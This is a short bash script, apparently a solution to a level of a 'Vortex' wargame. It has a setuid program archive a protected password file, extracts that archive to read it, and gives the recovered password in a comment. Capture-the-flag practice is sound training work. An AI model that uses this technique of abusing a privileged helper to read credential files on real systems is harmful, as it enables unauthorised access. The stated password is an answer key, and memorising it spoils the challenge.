#!/bin/bash

#Author Christopher Rodriguez

#Tar the password
/vortex/vortex2 /etc/vortex_pass/vortex3 /etc/vortex_pass/vortex3 /etc/vortex_pass/vortex3

#Print out the password
tar xf '/tmp/ownership.$$.tar' --to-stdout

#The password is 64ncXTvx#
